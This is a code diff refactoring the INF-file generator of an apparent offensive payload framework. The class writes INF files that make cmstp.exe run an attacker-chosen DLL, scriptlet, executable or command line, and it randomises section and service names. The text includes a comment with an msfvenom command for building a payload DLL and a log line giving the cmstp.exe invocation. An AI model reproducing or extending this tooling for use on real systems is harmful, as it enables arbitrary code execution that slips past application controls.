@@ -56,12 +56,12 @@ class InfGenerator(PayloadBuilder):
     
     def check(self):
         self.targetPath = ""
-        dictKey = "Target path (.exe, .dll, .sct) or command line"
         if not self.mpSession.htaMacro:
+            dictKey = "Target path (.exe, .dll, .sct) or command line"
             paramArray = [MPParam(dictKey)]
             self.fillInputParams(paramArray)
 
-            if str(self.targetPath).lower().endswith(".dll"):
+            if self.targetPath.lower().endswith(".dll"):
                 self.targetPath = getParamValue(paramArray, dictKey)
             elif str(self.targetPath).lower().endswith(".sct"):
                 self.targetPath = getParamValue(paramArray, dictKey)
@@ -75,45 +75,43 @@ class InfGenerator(PayloadBuilder):
         
     
     def generate(self):
-        logging.info(" [+] Generating %s file..." % self.outputFileType)
+        logging.info(f" [+] Generating {self.outputFileType} file...")
         # Fill template
         infContent = INF_TEMPLATE
-             
-        if not self.mpSession.dosCommand:
 
-            if str(self.targetPath).lower().endswith(".dll"):
-                logging.info("   [-] Target is DLL...")
-                # Ex to generate calc launching dll (OCX payload for 64bit PC:
-                # msfvenom -p windows/x64/exec cmd=calc.exe -f dll -o calc64.dll
-                infContent = infContent.replace("<<<TARGET_PATH>>>", "%s" % self.targetPath)
-                infContent = infContent.replace("<<<SECTION_TYPE>>>", "UnRegisterOCXs") 
-            elif str(self.targetPath).lower().endswith(".sct"):
-                logging.info("   [-] Target is Scriptlet file...")
-                infContent = infContent.replace("<<<TARGET_PATH>>>", "%%11%%\\scrobj.dll,NI,%s" % self.targetPath)
-                infContent = infContent.replace("<<<SECTION_TYPE>>>", "UnRegisterOCXs")
-            elif str(self.targetPath).lower().endswith(".exe"):
-                logging.info("   [-] Target is exe file...")
-                infContent = infContent.replace("<<<TARGET_PATH>>>", self.targetPath)
-                infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands") 
-            else:
-                logging.warning("   [!] Could not recognize extension, assuming executable file or command line.")
-                infContent = infContent.replace("<<<TARGET_PATH>>>", self.mpSession.dosCommand)
-                infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands") 
-        else:
+        if self.mpSession.dosCommand:
             logging.warning("   [-] Target is command line.")
             infContent = infContent.replace("<<<TARGET_PATH>>>", self.mpSession.dosCommand)
             infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands") 
-            
+
+        elif str(self.targetPath).lower().endswith(".dll"):
+            logging.info("   [-] Target is DLL...")
+                # Ex to generate calc launching dll (OCX payload for 64bit PC:
+                # msfvenom -p windows/x64/exec cmd=calc.exe -f dll -o calc64.dll
+            infContent = infContent.replace("<<<TARGET_PATH>>>", f"{self.targetPath}")
+            infContent = infContent.replace("<<<SECTION_TYPE>>>", "UnRegisterOCXs")
+        elif str(self.targetPath).lower().endswith(".sct"):
+            logging.info("   [-] Target is Scriptlet file...")
+            infContent = infContent.replace("<<<TARGET_PATH>>>", "%%11%%\\scrobj.dll,NI,%s" % self.targetPath)
+            infContent = infContent.replace("<<<SECTION_TYPE>>>", "UnRegisterOCXs")
+        elif str(self.targetPath).lower().endswith(".exe"):
+            logging.info("   [-] Target is exe file...")
+            infContent = infContent.replace("<<<TARGET_PATH>>>", self.targetPath)
+            infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands")
+        else:
+            logging.warning("   [!] Could not recognize extension, assuming executable file or command line.")
+            infContent = infContent.replace("<<<TARGET_PATH>>>", self.mpSession.dosCommand)
+            infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands")
         # Randomize mandatory info    
         infContent = infContent.replace("<<<SECTION_NAME>>>", randomAlpha(8))
         infContent = infContent.replace("<<<SERVICE_NAME>>>", randomAlpha(8))
-             
-        # Write in new file
-        f = open(self.outputFilePath, 'w')
-        f.writelines(infContent)
-        f.close()
-        
-        logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
+
+        with open(self.outputFilePath, 'w') as f:
+            f.writelines(infContent)
+        logging.info(
+            f"   [-] Generated {self.outputFileType} file path: {self.outputFilePath}"
+        )
+
         logging.info("   [-] Test with : cmstp.exe /ns /s %s\n" % self.outputFilePath)
         
 
